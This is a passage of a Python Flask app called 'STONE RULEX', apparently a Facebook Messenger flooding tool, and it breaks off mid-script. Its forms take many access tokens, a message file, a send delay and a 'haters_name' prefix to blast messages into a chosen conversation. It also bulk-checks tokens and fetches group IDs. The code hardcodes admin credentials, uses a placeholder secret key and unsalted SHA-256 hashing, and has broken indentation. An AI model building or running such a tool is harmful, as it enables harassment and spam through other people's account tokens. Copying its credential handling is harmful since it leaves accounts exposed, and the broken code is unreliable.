from flask import Flask, render_template_string, request, redirect, url_for, jsonify, session, flash
import requests
import json
import time
import os
import threading
from datetime import datetime
import uuid
import sqlite3
import hashlib
from functools import wraps

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this to a random secret key

# Database initialization
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Create users table with approval status
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT UNIQUE,
                 password TEXT,
                 admin INTEGER DEFAULT 0,
                 approved INTEGER DEFAULT 0,
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    # Create admin user if not exists
        c.execute("SELECT * FROM users WHERE username = 'the_stone_rulex'")
    if not c.fetchone():
        hashed_password = hashlib.sha256('stone_the king'.encode()).hexdigest()
        c.execute("INSERT INTO users (username, password, admin, approved) VALUES (?, ?, 1, 1)", 
                 ("the_stone_rulex", hashed_password))
    
    conn.commit()
    conn.close()

init_db()

# Global variables
message_threads = {}  # Dictionary to store multiple threads with their IDs
task_logs = {}  # Dictionary to store logs for each task
stop_flags = {}  # Dictionary to store stop flags for each task

# Authentication decorators
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def approved_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1:
            return render_template_string(pending_approval_html)
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT admin, approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1 or user[1] != 1:
            return "Admin access required", 403
        return f(*args, **kwargs)
    return decorated_function

# Pending approval page HTML
pending_approval_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Pending Approval</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .pending-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            padding: 40px;
            text-align: center;
        }
        
        .pending-icon {
            font-size: 4rem;
            color: #ffc107;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .pending-title {
            font-size: 2rem;
            color: #495057;
            margin-bottom: 15px;
            font-weight: 700;
        }
        
        .pending-message {
            font-size: 1.1rem;
            color: #6c757d;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn-logout:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .status-info {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="pending-container">
        <div class="pending-icon">Ã¢ÂÂ³</div>
        <h1 class="pending-title">Account Pending Approval</h1>
        <div class="status-info">
            <strong>Your account is currently under review</strong><br>
            Please wait for an administrator to approve your access to STONE RULEX tools.
        </div>
        <p class="pending-message">
            Thank you for registering! Your account has been created successfully, but it requires approval from an administrator before you can access the tools. You will be notified once your account is approved.
        </p>
        <a href="/logout" class="btn-logout">Logout</a>
    </div>
</body>
</html>
'''

# Enhanced login/register HTML with fancy styling and Admin Login tab
auth_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Access Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="75" cy="75" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="50" cy="10" r="0.5" fill="rgba(255,255,255,0.05)"/><circle cx="10" cy="50" r="0.5" fill="rgba(255,255,255,0.05)"/><circle cx="90" cy="30" r="0.5" fill="rgba(255,255,255,0.05)"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
            opacity: 0.3;
        }
        
        .auth-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
        
        .auth-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .auth-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="20" cy="20" r="2" fill="rgba(255,255,255,0.1)"/><circle cx="80" cy="80" r="1.5" fill="rgba(255,255,255,0.1)"/><circle cx="60" cy="30" r="1" fill="rgba(255,255,255,0.05)"/></svg>');
        }
        
        .auth-title {
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 1;
        }
        
        .auth-subtitle {
            font-size: 1rem;
            opacity: 0.9;
            position: relative;
            z-index: 1;
        }
        
        .auth-tabs {
            display: flex;
            background: #f8f9fa;
            border-bottom: 1px solid #e9ecef;
        }
        
        .auth-tab {
            flex: 1;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            font-weight: 700;
            color: #6c757d;
            transition: all 0.3s ease;
            position: relative;
            background: transparent;
            border: none;
            font-size: 16px;
        }
        
        .auth-tab:hover {
            background: #e9ecef;
            color: #667eea;
        }
        
        .auth-tab.active {
            color: #667eea;
            background: white;
        }
        
        .auth-tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .auth-form {
            display: none;
            padding: 40px 30px;
        }
        
        .auth-form.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        .form-group i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #6c757d;
            font-size: 18px;
            z-index: 1;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #495057;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 18px 18px 18px 50px;
            border: 2px solid #e9ecef;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f8f9fa;
            font-family: inherit;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }
        
        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(40, 167, 69, 0.4);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
            color: #212529;
        }
        
        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(255, 193, 7, 0.4);
        }
        
        .alert {
            padding: 15px 20px;
            border-radius: 10px;
            margin-top: 20px;
            font-weight: 600;
            text-align: center;
        }
        
        .alert-danger {
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .alert-success {
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .form-footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
            color: #6c757d;
            font-size: 14px;
        }
        
        @media (max-width: 480px) {
            .auth-container {
                margin: 10px;
                border-radius: 20px;
            }
            
            .auth-header {
                padding: 30px 20px;
            }
            
            .auth-title {
                font-size: 2rem;
            }
            
            .auth-form {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="auth-header">
            <h1 class="auth-title">STONE RULEX</h1>
            <p class="auth-subtitle">Welcome To The Stone Rulex Convo Server</p>
        </div>
        
        <div class="auth-tabs">
            <button class="auth-tab active" onclick="switchAuthTab('login')">
                <i class="fas fa-sign-in-alt"></i> Login
            </button>
            <button class="auth-tab" onclick="switchAuthTab('register')">
                <i class="fas fa-user-plus"></i> Register
            </button>
            <button class="auth-tab" onclick="switchAuthTab('admin')">
                <i class="fas fa-user-shield"></i> Admin Login
            </button>
        </div>
        
        <div id="login-form" class="auth-form active">
            <form action="/login" method="post">
                <div class="form-group">
                    <label for="login-email">
                        <i class="fas fa-user"></i> Username
                    </label>
                    <i class="fas fa-user"></i>
                    <input type="text" id="login-username" name="username" placeholder="Enter your username" required>
                </div>
                <div class="form-group">
                    <label for="login-password">
                        <i class="fas fa-lock"></i> Password
                    </label>
                    <i class="fas fa-lock"></i>
                    <input type="password" id="login-password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="btn btn-primary">
                    <i class="fas fa-sign-in-alt"></i> Access Platform
                </button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['error']) %}
                {% if messages %}
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> {{ messages[0] }}
                    </div>
                {% endif %}
            {% endwith %}
            
            <div class="form-footer">
                <i class="fas fa-shield-alt"></i> Secure authentication powered by advanced encryption
            </div>
        </div>
        
        <div id="register-form" class="auth-form">
            <form action="/register" method="post">
                <div class="form-group">
                    <label for="register-email">
                        <i class="fas fa-user"></i> Username
                    </label>
                    <i class="fas fa-user"></i>
                    <input type="text" id="register-username" name="username" placeholder="Enter your username" required>
                </div>
                <div class="form-group">
                    <label for="register-password">
                        <i class="fas fa-lock"></i> Password
                    </label>
                    <i class="fas fa-lock"></i>
                    <input type="password" id="register-password" name="password" placeholder="Create a password" required>
                </div>
                <div class="form-group">
                    <label for="confirm-password">
                        <i class="fas fa-lock"></i> Confirm Password
                    </label>
                    <i class="fas fa-lock"></i>
                    <input type="password" id="confirm-password" name="confirm_password" placeholder="Confirm your password" required>
                </div>
                <button type="submit" class="btn btn-success">
                    <i class="fas fa-user-plus"></i> Create Account
                </button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['success', 'error']) %}
                {% if messages %}
                    <div class="alert {% if 'success' in get_flashed_messages(with_categories=true)[0][0] %}alert-success{% else %}alert-danger{% endif %}">
                        <i class="fas {% if 'success' in get_flashed_messages(with_categories=true)[0][0] %}fa-check-circle{% else %}fa-exclamation-triangle{% endif %}"></i> {{ messages[0] }}
                    </div>
                {% endif %}
            {% endwith %}
            
            <div class="form-footer">
                <i class="fas fa-info-circle"></i> New accounts require administrator approval
            </div>
        </div>
        
        <div id="admin-form" class="auth-form">
            <form action="/admin_login" method="post">
                <div class="form-group">
                    <label for="admin-email">
                        <i class="fas fa-user-shield"></i> Admin Email
                    </label>
                    <i class="fas fa-user-shield"></i>
                    <input type="text" id="admin-username" name="username" placeholder="Enter admin username" required>
                </div>
                <div class="form-group">
                    <label for="admin-password">
                        <i class="fas fa-key"></i> Admin Password
                    </label>
                    <i class="fas fa-key"></i>
                    <input type="password" id="admin-password" name="password" placeholder="Enter admin password" required>
                </div>
                <button type="submit" class="btn btn-warning">
                    <i class="fas fa-user-shield"></i> Admin Access
                </button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['admin_error']) %}
                {% if messages %}
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> {{ messages[0] }}
                    </div>
                {% endif %}
            {% endwith %}
            
            <div class="form-footer">
                <i class="fas fa-shield-alt"></i> Administrator access with elevated privileges
            </div>
        </div>
    </div>

    <script>
        function switchAuthTab(tab) {
            // Remove active class from all tabs and forms
            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
            
            // Add active class to selected tab and form
            if (tab === 'login') {
                document.querySelector('.auth-tab:first-child').classList.add('active');
                document.getElementById('login-form').classList.add('active');
            } else if (tab === 'register') {
                document.querySelector('.auth-tab:nth-child(2)').classList.add('active');
                document.getElementById('register-form').classList.add('active');
            } else if (tab === 'admin') {
                document.querySelector('.auth-tab:nth-child(3)').classList.add('active');
                document.getElementById('admin-form').classList.add('active');
            }
        }
        
        // Add some interactive effects
        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.style.transform = 'scale(1.02)';
                });
                
                input.addEventListener('blur', function() {
                    this.parentElement.style.transform = 'scale(1)';
                });
            });
        });
    </script>
</body>
</html>
'''



# Main application HTML with enhanced styling
html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            max-width: 1200px;
            margin: 0 auto;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }
        
        .user-info {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .user-email {
            color: white;
            font-weight: 600;
        }
        
        .btn-logout {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
        }
        
        .btn-logout:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .tabs {
            display: flex;
            background: #f8f9fa;
            border-bottom: 1px solid #dee2e6;
        }
        
        .tab {
            flex: 1;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            background: #f8f9fa;
            border: none;
            font-size: 16px;
            font-weight: 600;
            color: #495057;
            transition: all 0.3s ease;
            position: relative;
        }
        
        .tab:hover {
            background: #e9ecef;
            color: #007bff;
        }
        
        .tab.active {
            background: white;
            color: #007bff;
        }
        
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .tab-content {
            display: none;
            padding: 30px;
            min-height: 500px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #495057;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        input[type="text"],
        input[type="number"],
        input[type="text"],
        input[type="password"],
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }
        
        input[type="text"]:focus,
        input[type="number"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus,
        textarea:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        textarea {
            resize: vertical;
            min-height: 120px;
            font-family: 'Courier New', monospace;
        }
        
        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin: 5px;
            min-width: 150px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
            color: white;
        }
        
        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(220, 53, 69, 0.3);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
            color: #212529;
        }
        
        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 193, 7, 0.3);
        }
        
        .task-item {
            background: white;
            border: 1px solid #e9ecef;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
            transition: all 0.3s ease;
        }
        
        .task-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
        }
        
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        
        .task-id {
            font-weight: 700;
            color: #667eea;
            font-size: 18px;
        }
        
        .task-status {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .status-running {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
        }
        
        .status-stopped {
            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
            color: white;
        }
        
        .task-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .task-info-item {
            background: #f8f9fa;
            padding: 10px 15px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .task-info-label {
            font-size: 12px;
            color: #6c757d;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 5px;
        }
        
        .task-info-value {
            font-weight: 600;
            color: #495057;
        }
        
        .task-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .log-container {
            background: #1e1e1e;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            padding: 20px;
            border-radius: 10px;
            height: 400px;
            overflow-y: auto;
            margin-top: 15px;
            border: 2px solid #333;
            display: none;
        }
        
        .log-container.show {
            display: block;
        }
        
        .log-entry {
            margin-bottom: 5px;
            line-height: 1.4;
        }
        
        .result-container {
            margin-top: 20px;
        }
        
        .result-item {
            background: white;
            border: 1px solid #e9ecef;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
        }
        
        .result-valid {
            border-left: 5px solid #28a745;
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
        }
        
        .result-invalid {
            border-left: 5px solid #dc3545;
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
        }
        
        .token-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minItems(200px, 1fr));
            gap: 15px;
            margin-top: 10px;
        }
        
        .token-info-item {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .profile-pic {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 3px solid #667eea;
        }
        
        .group-item {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }
        
        .group-item:hover {
            background: white;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .group-name {
            font-weight: 600;
            color: #667eea;
            margin-bottom: 5px;
        }
        
        .group-uid {
            font-family: 'Courier New', monospace;
            color: #6c757d;
            font-size: 12px;
            background: #e9ecef;
            padding: 5px 10px;
            border-radius: 5px;
            display: inline-block;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #6c757d;
        }
        
        .loading::after {
            content: '';
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #6c757d;
        }
        
        .empty-state i {
            font-size: 4rem;
            margin-bottom: 20px;
            opacity: 0.3;
        }
        
        @media (max-width: 768px) {
            .tabs {
                flex-direction: column;
            }
            
            .task-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
            
            .task-buttons {
                width: 100%;
            }
            
            .btn {
                flex: 1;
                min-width: auto;
            }
            
            .user-info {
                position: static;
                justify-content: center;
                margin-top: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>STONE RULEX</h1>
            <p>Advanced Social Media Automation Platform</p>
            <div class="user-info">
                <span class="user-username">{{ session.user_username }}</span>
                {% if session.is_admin %}
                <a href="/admin" class="btn btn-warning">
                    <i class="fas fa-cog"></i> Admin Panel
                </a>
                {% endif %}
                <a href="/logout" class="btn-logout">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="switchTab('bot-tab')">
                <i class="fas fa-envelope"></i> CONVO TOOL
            </button>
            <button class="tab" onclick="switchTab('token-tab')">
                <i class="fas fa-key"></i> TOKEN CHECK
            </button>
            <button class="tab" onclick="switchTab('groups-tab')">
                <i class="fas fa-users"></i> UID FETCHER
            </button>
            <button class="tab" onclick="switchTab('logs-tab')">
                <i class="fas fa-chart-bar"></i> TASK MANAGER
            </button>
        </div>
        
        <div id="bot-tab" class="tab-content active">
            <form action="/run_bot" method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="convo_uid">
                        <i class="fas fa-comments"></i> Conversation UID
                    </label>
                    <input type="text" id="convo_uid" name="convo_uid" placeholder="Enter conversation UID" required>
                </div>

                <div class="form-group">
                    <label for="token">
                        <i class="fas fa-key"></i> Access Tokens (one per line)
                    </label>
                    <textarea id="token" name="token" placeholder="Enter your access tokens, one per line" required></textarea>
                </div>

                <div class="form-group">
                    <label for="message_file">
                        <i class="fas fa-file-text"></i> Message File
                    </label>
                    <input type="file" id="message_file" name="message_file" accept=".txt" required>
                </div>

                <div class="form-group">
                    <label for="speed">
                        <i class="fas fa-clock"></i> Message Speed (seconds)
                    </label>
                    <input type="number" id="speed" name="speed" value="1" min="0" step="1" placeholder="Delay between messages" required>
                </div>

                <div class="form-group">
                    <label for="haters_name">
                        <i class="fas fa-tag"></i> Prefix Name
                    </label>
                    <input type="text" id="haters_name" name="haters_name" placeholder="Name to prefix messages with" required>
                </div>

                <button type="submit" class="btn btn-success">
                    <i class="fas fa-rocket"></i> Start New Task
                </button>
            </form>
        </div>
        
        <div id="token-tab" class="tab-content">
            <div class="form-group">
                <label for="check_tokens">
                    <i class="fas fa-key"></i> Tokens to Check (one per line)
                </label>
                <textarea id="check_tokens" name="check_tokens" placeholder="Enter tokens to validate, one per line"></textarea>
            </div>
            <button onclick="checkTokens()" class="btn btn-primary">
                <i class="fas fa-search"></i> Check Tokens
            </button>
            <div id="token-results" class="result-container"></div>
        </div>
        
        <div id="groups-tab" class="tab-content">
            <div class="form-group">
                <label for="groups_token">
                    <i class="fas fa-key"></i> Valid Access Token
                </label>
                <textarea id="groups_token" name="groups_token" placeholder="Enter a valid Facebook token to fetch messenger groups"></textarea>
            </div>
            <button onclick="fetchGroups()" class="btn btn-primary">
                <i class="fas fa-users"></i> Fetch Messenger Groups
            </button>
            <div id="groups-results" class="result-container"></div>
        </div>
        
        <div id="logs-tab" class="tab-content">
            <div id="tasks-container">
                <!-- Tasks will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabId) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab content
            document.getElementById(tabId).classList.add('active');
            
            // Update active tab
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            // If switching to logs tab, refresh tasks
            if (tabId === 'logs-tab') {
                refreshTasks();
            }
        }
        
        function checkTokens() {
            const tokens = document.getElementById('check_tokens').value.split('\\n').filter(t => t.trim());
            const resultsContainer = document.getElementById('token-results');
            
            if (tokens.length === 0) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter at least one token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Checking tokens...</div>';
            
            fetch('/check_tokens', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({tokens: tokens}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                data.results.forEach(result => {
                    const div = document.createElement('div');
                    div.className = result.valid ? 'result-item result-valid' : 'result-item result-invalid';
                    
                    let content = `<strong>Token:</strong> ${result.token.substring(0, 20)}...<br>`;
                    content += `<strong>Status:</strong> ${result.message}<br>`;
                    
                    if (result.valid) {
                        content += '<div class="token-info">';
                        if (result.name) {
                            content += `<div class="token-info-item"><strong>Name:</strong> ${result.name}</div>`;
                        }
                        if (result.id) {
                            content += `<div class="token-info-item"><strong>ID:</strong> ${result.id}</div>`;
                        }
                        if (result.picture) {
                            content += `<div class="token-info-item"><img src="${result.picture}" class="profile-pic" alt="Profile"></div>`;
                        }
                        content += '</div>';
                    }
                    
                    div.innerHTML = content;
                    resultsContainer.appendChild(div);
                });
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error checking tokens</div>';
            });
        }
        
        function fetchGroups() {
            const token = document.getElementById('groups_token').value.trim();
            const resultsContainer = document.getElementById('groups-results');
            
            if (!token) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter a valid token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Fetching messenger groups...</div>';
            
            fetch('/fetch_groups', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({token: token}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                if (data.success) {
                    if (data.groups.length === 0) {
                        resultsContainer.innerHTML = '<div class="empty-state"><i class="fas fa-users"></i><h3>No Groups Found</h3><p>No messenger groups were found for this token</p></div>';
                        return;
                    }
                    
                    const div = document.createElement('div');
                    div.className = 'result-item result-valid';
